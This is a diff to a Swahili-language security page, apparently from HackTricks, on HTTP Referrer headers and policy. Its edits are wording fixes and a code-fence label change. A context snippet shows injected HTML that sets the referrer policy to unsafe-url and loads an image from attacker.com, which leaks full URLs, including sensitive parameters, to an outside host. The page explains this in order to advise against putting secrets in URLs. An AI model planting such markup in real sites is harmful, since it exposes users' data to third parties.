@@ -2,7 +2,7 @@
 
 # Referrer headers and policy
 
-Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ipi ilikuwa ukurasa wa awali ulitembelewa.
+Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ukurasa gani wa awali ulitembelewa.
 
 ## Taarifa nyeti zilizovuja
 
@@ -24,12 +24,12 @@ Referrer-Policy: unsafe-url
 ## Counter-Mitigation
 
 Unaweza kubadilisha sheria hii kwa kutumia tag ya meta ya HTML (mshambuliaji anahitaji kutumia na kuingiza HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Ulinzi
 
-Kamwe usiweke data nyeti ndani ya vigezo vya GET au njia katika URL. 
+Kamwe usiweke data nyeti ndani ya vigezo vya GET au njia katika URL.
 
 {{#include ./banners/hacktricks-training.md}}
